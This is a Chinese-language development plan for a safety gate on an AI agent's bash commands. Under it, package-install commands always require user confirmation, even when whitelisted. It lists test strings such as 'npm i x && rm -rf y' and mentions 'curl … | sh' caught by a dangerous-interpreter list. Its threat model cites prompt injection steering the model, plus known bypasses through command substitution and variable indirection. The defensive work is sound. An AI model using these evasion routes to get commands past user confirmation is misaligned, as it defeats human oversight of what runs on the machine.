    - 行为断言：`npm i x && rm -rf y` 与 `npm i x && sudo foo` 返回 `reason === 'danger'`（同段共存时 danger 优先）
    - 行为断言：`matchesWhitelist('`npm i x`', ['npm *']) === false`（残余风险严重性判断的机械证据）
    - 行为断言：`evaluateBashCommand('`npm i x`', ['npm *'])` 的 `level === 'confirm'` 且 `reason !== 'install'`（「安装档漏检 ≠ 该命令被免确认」这一结论的机械证据）
    - 源码断言：`PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 含「不覆盖的形态」段落，至少点名命令替换 / 变量间接与 `echo` 字面量误报两类，**且每类都带使用频率与绕过难度的判断**（JSDoc 中可检索到「频率」/「难度」或等义英文措辞）
  </acceptance_criteria>
  <done>install 档对旗标前置、引号包裹、管道右侧、多环境变量前缀四类常见形态都能命中；残余风险（命令替换 / 变量间接 / 字面量误报）被如实写进代码注释并有一条断言佐证其严重性有限。</done>
</task>

<task type="auto">
  <name>Task 3: SEC-01 与 P1-b 门禁信号断言收敛（只读反例清单 + 白名单不可越过 + 反向验证）</name>
  <files>tests/test-ai-bash-policy.js</files>
  <read_first>
    - tests/test-ai-bash-policy.js 全文（Task 1/2 后的现状）
    - 47-VALIDATION.md §「Gate → Acceptance Signal Map」（P1-b-1..b-5 五条信号的观测方式）
    - 47-RESEARCH.md §E-4（用例清单）、§G（门禁 → 任务映射建议）
    - 47-CONTEXT.md D-14 / D-15 / D-16
  </read_first>
  <action>
    1. 为 P1-b-1..b-5 五条信号各落一条**可独立报告**的断言（命名直接带信号号，便于门禁审计逐条对照）：
       - `P1-b-1`：白名单含 `npm *` / `npx` / `brew *` 三种写法时，对应安装命令仍 `reason === 'install'`
       - `P1-b-2`：D-13 的 13 个家族各 ≥1 条正例命中（用一张 `{ family, command }` 表驱动，断言逐族通过）
       - `P1-b-3`：D-16 的只读反例（≥14 条）全部不命中（同一张表驱动）
       - `P1-b-4`：`methodBody(readSource('ai-manager.js'), '_createBashToolWithPolicy')` 含 `reason === 'install'`、`'high'`、`'包管理器'`（若 Task 1 已加，此处补齐 `title` 的 `'AI 请求安装第三方软件包'` 子串）
       - `P1-b-5`：既有 32 例与新增用例合流后 `# fail 0`（这条不写断言，作为 `<verify>` 的观测口径记录在任务 `done` 里）
    2. 加**反向验证**（必须实际执行一次并记录在 SUMMARY）：临时从 `PACKAGE_MANAGER_INSTALL_PATTERNS` 删掉 `npm` 那一条，确认「白名单不可越过」的门禁核心断言**变红**；还原后转绿。这证明门禁断言不是空转。
    3. 加一条**影子断言**防未来漂移：`PACKAGE_MANAGER_INSTALL_PATTERNS` 的三项完整性 —— ① 全表长度 `>= 13`；② 每条 `name` 是非空字符串（当前实现为中文描述）；③ 每条 `pattern` 能被 `new RegExp(pattern)` 成功构造（防止后续有人误删条目、写坏正则，或把 `pattern` 写成非字符串而测试仍绿）。同时断言 `require('../ai-bash-policy').PACKAGE_MANAGER_INSTALL_PATTERNS` 与 `matchInstall` 两个导出都存在（导出面是 47-04 文档与下游阶段的契约）。
  </action>
  <verify>
    <automated>node --test tests/test-ai-bash-policy.js 2>&1 | grep -E "^# (tests|pass|fail)"</automated>
    <fails_when>输出中 `# fail` 不是 0；或 `# tests` 小于 62（既有 32 例 + 新增用例的下限）；或输出中完全不出现 `# pass` 行</fails_when>
  </verify>
  <acceptance_criteria>
    - 行为断言：P1-b-1 / P1-b-2 / P1-b-3 / P1-b-4 四条信号各有独立断言且全部通过
    - 行为断言：`# fail 0`，且 `# tests` 计数 ≥62（既有 32 + 新增 ≥30）
    - 行为断言：`PACKAGE_MANAGER_INSTALL_PATTERNS.length >= 13`，且每条 `name` 非空
    - 反向验证已执行并记录：删掉 `npm` 条目后门禁核心断言变红，还原后转绿（证明非空转）
  </acceptance_criteria>
  <done>P1 门禁的第二半（SEC-01）具备逐信号可审计的机械断言，且断言被证明不是空转；只读反例清单由表驱动，未来新增只读子命令只需加一行。</done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| 模型（LLM，可被网页提示注入影响）→ `evaluateBashCommand` | 命令文本是**不可信输入**：模型决定执行什么，用户只看到确认卡片上的一条命令 |
| `settings.aiBashWhitelist`（用户在设置页维护）→ 免确认判定 | 用户为减少弹框会把命令前缀加进白名单；白名单是**用户意图**而非**安全边界** |
| `verdict` → `requestActionConfirmation` 确认卡片 | 卡片文案是用户唯一的决策依据（「卡片所见即所确认」） |
| bash 子进程 → 宿主机 | `bash` 能力等同终端；确认后命令可以写工作区外任意路径 |

## STRIDE Threat Register

| Threat ID | Category | Component | Severity | Disposition | Mitigation Plan |
|-----------|----------|-----------|----------|-------------|-----------------|
| T-47-02-01 | **Elevation of Privilege** | `npx` / `npm i` 类安装命令经白名单永久免确认 | **high** | mitigate | `install` 短路**先于** `matchesWhitelist`（D-14），`reason === 'install'` 必经 confirm 且 `riskLevel === 'high'`；**门禁核心断言**「白名单含 `npm *` 时 `npm i x` 仍 confirm/install」+ 反向验证证明断言非空转。**这是 P1 门禁的第二半** |
| T-47-02-02 | Elevation of Privilege | `postinstall` 脚本隐式代码执行（`npm ci` 不取新代码但仍执行所有依赖的 postinstall） | high | mitigate | `npm ci` **计入**安装档（D-16 的显式决策）；理由写进 `PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 与 47-04 的文档（「不取新代码」不等于不执行任意代码） |
| T-47-02-03 | Elevation of Privilege（间接） | **误伤驱动白名单扩大**：`npm run dev` 被误判 → 用户把 `npm` 整个加进白名单 → 一次放开安装档 | high | mitigate | 命令名 + 子命令粒度判定（D-16）；≥14 条只读反例断言（硬要求）由表驱动，未来新增只读子命令只需加一行；实测 0 误伤 |
| T-47-02-04 | Elevation of Privilege（残余） | 命令替换 / 变量间接绕过 install 检测（`` `npm i x` ``、`NPM=npm $NPM i x`） | medium | accept | **无技术缓解**（既有引擎已声明的静态边界，`ai-bash-policy.js:10-12`）。严重性有限：这类形态**也不命中白名单**（整段前缀不以 `npm` 开头）→ 仍弹 `confirm/default` 卡片；已加断言 `matchesWhitelist('`npm i x`', ['npm *']) === false` 佐证，并在 JSDoc 里如实记录 |
| T-47-02-05 | Spoofing | 确认卡片文案被拉平（install 与 danger 用同一文案/title） | low | mitigate | install 分支有**专属 title**（`'AI 请求安装第三方软件包'`）与专属 `dangerHint`（点名安装的家族 + 「不会因为加入白名单而免确认」），由源码扫描断言锁定；避免 `brew install wget` 与 `rm -rf` 在 UI 上无法区分 |
| T-47-02-06 | Tampering | 安装档被并入 `DANGEROUS_PATTERNS`（语义塌陷） | low | mitigate | `reason` 取值 `'install'` 与 `'danger'` 分离，由 `strictEqual(verdict.reason, 'install')` 系列断言锁定；`npx` / `uvx` 不进 `DANGEROUS_INTERPRETERS` |
| T-47-02-SC | Tampering | npm / 依赖安装 | medium | mitigate | **本计划零新增依赖**（只改三个既有文件，不碰 `package.json` 的依赖段）；不执行任何安装命令 → 无包合法性 gate 触发 |
</threat_model>

<edge_coverage_ledger>
`SPECLESS_FALLBACK=true` / `EDGE_ABSENT=1`：本阶段无 SPEC，edge-probe 把全部 8 条需求判为 `unclassified` / `unresolved`（`applicable = 8`，`resolved = 0`）。按 §A「`unclassified` 一律不得自动 resolve」的纪律，本计划负责的 **1 行**结清如下：**1 = 0（写入 must_haves.truths）+ 1（显式 flagged assumption）**。

| # | requirement_id | probe category | 处置 | 落点 |
|---|----------------|----------------|------|------|
| 1 | SEC-01 | unclassified | **flagged assumption** | 「只读反例清单（`npm run` / `test` / `ls` / `view` / `audit` / `outdated`、`brew info` / `list` / `search`、`pip list` / `show`、`cargo search`、`go list` 等 14+ 条）是**人工枚举**的，不是穷举 —— 白名单本身是开放集合，未来新工具的子命令无法预判；判定口径是命令名 + 子命令模式，不是语法分析。同理，`apt install` 之外的发行版包管理器（`pacman` / `dnf` / `zypper` / `apk`）**不在**本阶段家族清单内（macOS 目标平台不涉及），已由 §E-1 的实测结论与 §Security Domain 的残余风险条记录」 |

> 工具缺口如实记录（来自 orchestrator）：本机安装的 `edge-probe.cjs` 的 `SHAPE_CUES` 映射为空对象，其散文启发式把 8 条需求全部判为 `unclassified`、无法产出类别化探针。因此上表是**文本派生结果，不是本阶段的覆盖上限** —— 真正的验证底座是 `47-VALIDATION.md` 的 P1-b-1..b-5 五条信号与 Task 3 的逐条断言。
</edge_coverage_ledger>

<verification>
1. `node --test tests/test-ai-bash-policy.js 2>&1 | grep -E "^# (tests|pass|fail)"` → `# fail 0` 且 `# tests` ≥62
2. `node tests/test-agent-workspace.js` 退出 0（本计划不碰沙箱，回归确认）
3. `node tests/test-ai-skills.js` 退出 0（本计划不碰技能加载，回归确认）
4. 源码 gate：`BASE=$(cat "$(git rev-parse --git-dir)/gsd-plan-head-before-47-02")`，**先守卫空基线**（`test -n "$BASE" || { echo "plan-head 台账未解析（基线为空）—— 判据不得以空基线求值"; exit 1; }`）；`git diff -U0 "$BASE"..HEAD -- ai-bash-policy.js` 的变更行号区间与四个既有函数体（从 `git show "$BASE:ai-bash-policy.js"` 计算行号区间）**零交集**，且变更区间**只**落在文件头 JSDoc / `PACKAGE_MANAGER_INSTALL_PATTERNS` / `stripLeadingQuotes` / `matchInstall` / `evaluateBashCommand` / `module.exports` 六处（**不要用裸 `git diff`**；也不要只看 `--stat`）
5. `node --check ai-bash-policy.js && node --check ai-manager.js` 全过
6. 反向验证记录：删掉 `PACKAGE_MANAGER_INSTALL_PATTERNS` 的 `npm` 条目 → 门禁核心断言变红；还原 → 转绿
7. 源码 gate：`BASE=$(cat "$(git rev-parse --git-dir)/gsd-plan-head-before-47-02")`，**先守卫空基线**；`git diff "$BASE"..HEAD -- ai-manager.js` **只**落在 `_createBashToolWithPolicy` 一个方法体内（**不要用裸 `git diff`**）
8. 消费点复核：`grep -rn "evaluateBashCommand" --exclude-dir=node_modules --exclude-dir=.planning .` 的生产代码命中数 == 1（`ai-manager.js`），命中清单记入 SUMMARY
</verification>

<success_criteria>
- [ ] 13 个包管理器家族的安装语义命令无论是否在 `settings.aiBashWhitelist` 内，执行前都必须弹出确认卡片
- [ ] install 档走 `riskLevel: 'high'` + 专属 title 与文案
- [ ] 只读子命令（`npm run dev` / `npm test` / `brew info` / `pip list` 等 ≥14 条）零误伤
- [ ] `danger` 优先于 `install`；同段共存时返回 `danger`
- [ ] `level` 取值集不变（三档框架）；`reason` 新增 `'install'` 独立档
- [ ] 既有 32 例保持全绿，且 `installNames` 完整形状已同步到 2 条 `deepStrictEqual`
- [ ] 残余风险（命令替换 / 变量间接 / 字面量误报）如实写进**代码注释**并补齐频率 / 难度 / 后果三段论证，另有两条严重性佐证断言
- [ ] `PACKAGE_MANAGER_INSTALL_PATTERNS` 的表完整性有三项断言（长度 / `name` 非空 / `pattern` 可构造 RegExp）
- [ ] 消费点复核已执行：`evaluateBashCommand` 的生产代码调用点唯一（`ai-manager.js`），清单记入 SUMMARY
- [ ] 门禁断言经反向验证证明非空转
</success_criteria>

## Review Dispositions Ledger

### Round 1 — c4c58fe

### Review Feedback Addressed
| Concern | Severity | How Addressed |
|---------|----------|---------------|
| `ai-manager.js` 的三分支改动可能遗漏其他 `verdict` 消费点（opencode 判 HIGH，`L245@c4c58fe`）| HIGH（分歧项）| Task 1 step 11 + `<verification>` #8 + 验收条目：改动后跑 `grep -rn "evaluateBashCommand"` 并把命中清单写进 SUMMARY，生产代码命中数须为 1。**结论采纳评审侧实测**（`L425@c4c58fe`）：生产代码只有 `ai-manager.js:5647` 一处调用，`verdict.level`/`reason`/`dangerNames` 的使用集中在其后紧邻几行，opencode 的「日志/遥测未审查消费点」不成立 —— 但仍保留这条廉价 grep 作为护栏 |
| `npm ci` 为何计入安装档的论证要写进**代码注释**（`L44@c4c58fe` / `L410@c4c58fe`）| MEDIUM | Task 1 action step 1 JSDoc 第 ④ 点：明确「不取新代码 ≠ 不执行任意代码（执行所有依赖的 `postinstall`）」，写在 `PACKAGE_MANAGER_INSTALL_PATTERNS` 的代码注释里；验收含对应源码断言 |
| install 档残余风险的**严重性论证不足**（缺使用频率与绕过难度，`L254@c4c58fe` / `L410@c4c58fe`）| MEDIUM | Task 2 step 4 重写：三类残余形态各补「频率 / 难度 / 实际后果」三段，并新增第二条断言 `evaluateBashCommand('\`npm i x\`', ['npm *']).level === 'confirm'` 把「漏检 ≠ 免确认」钉成机械证据 |
| `stripLeadingQuotes` 的位置与用途未说明（`L78@c4c58fe` / `L246@c4c58fe`）| MEDIUM | Task 1 action step 2：强制一行注释说明它覆盖引号包裹命令名，且只在 `matchInstall` 内使用、不得提到 `normalizeSegment` 层 |
| `PACKAGE_MANAGER_INSTALL_PATTERNS` 的可维护性 / 模式表完整性（`L248@c4c58fe` / `L253@c4c58fe`）| LOW/MEDIUM | Task 1 step 1 JSDoc 第 ⑤ 点（维护约定：新增家族只需追加 `{ pattern, name }`）+ Task 3 step 3 三项完整性断言（长度 ≥13 / `name` 非空 / `pattern` 可构造 RegExp）+ 导出面断言 |
| 「四个函数零改动」用文件级 `git diff` 无法证明（`L79@c4c58fe`）| MEDIUM | Task 1 验收与 `<verification>` #4 改为**按函数体行号区间比对**：`git diff -U0 "$BASE"..HEAD` 的变更区间与基线版本中四个函数的行号区间零交集，且变更只落在六处 |
| `npm exec` 是 `npx` 的同义别名，未被覆盖（`L180@c4c58fe`）| MEDIUM | 策略侧由 `npm\s+(i\|install\|ci\|exec\|add)` 模式承接（Task 1 step 8 的必命中清单已含 `npm exec x`；47-01 Task 3 另加一条 `new RegExp(pattern).test('npm exec x') === true` 的扫描器正例断言）|
| `PACKAGE_MANAGER_INSTALL_PATTERNS` 的 JSDoc 要说明 `curl … \| sh` 在何处被处理（`L80@c4c58fe`）| LOW | Task 1 step 1 JSDoc 第 ② 点：写明「管道右侧 `sh`／`bash` 已属 `DANGEROUS_INTERPRETERS`，`danger` 先返回」，防止后人「补上这个遗漏」 |
| 测试基线数字以实跑为准（`L409@c4c58fe` / `L424@c4c58fe`）| MEDIUM | `<verification>` #1 沿用**实测**基线：`tests/test-ai-bash-policy.js` = **32 例**（planning 期已复跑确认 `# fail 0`），新增用例后 `# tests >= 62` |
| 白名单缺口实测成立（评审侧独立复核，`L426@c4c58fe`）| — | 确认 47-02 的门禁核心断言针对**真实缺口**：当前 `evaluateBashCommand('npm i x', ['npm *'])` → `{level:'allow'}`、`('npm i x', [])` → `confirm/default`，且 `DANGEROUS_INTERPRETERS` **不含** `npx` —— 计划的 Task 1 step 9 正是把这个缺口钉死 |

### Review Feedback Deferred
| Concern | Reason |
|---------|--------|
| 为 `reason` 新增独立常量 `const REASON_INSTALL = 'install'`（`L252@c4c58fe`）| **不采纳**：既有实现中 `'danger'` / `'default'` / `'empty'` 三个 reason 都是字面量，只给 `'install'` 单独提常量会制造新的不一致；且断言面用 `strictEqual(verdict.reason, 'install')` 已能锁死取值。若日后 reason 取值增多再统一提取 |
| `PACKAGE_MANAGER_INSTALL_PATTERNS` 在 Phase 48+ 如何发现新家族（`L249@c4c58fe`）| 已由「维护约定写进 JSDoc」覆盖（新增家族 = 追加一行）；**不建自动发现机制** —— 包管理器家族是低频变更的开集，自动发现反而会引入不可控的正则来源 |
| `apt` / `pacman` / `dnf` / `zypper` / `apk` 等发行版包管理器未纳入家族表（`L292@c4c58fe` 的 flagged assumption）| 本阶段目标平台为 macOS（`make install` 装 `.app`），这些家族不涉及；已作为显式 flagged assumption 记录在 `<edge_coverage_ledger>`，未静默丢弃 |
| 打包态 / `npm` 白名单语义变更的文档同步（`L40@c4c58fe`）| 属 **47-04 Task 2**（`docs/product/ai-agent-workspace.md` §四/§五 与 `AGENTS.md`）；本计划只在 `key_links` 里标注该契约，不改文档 |

<output>
Create `.planning/phases/47-bash/47-02-SUMMARY.md` when done
</output>
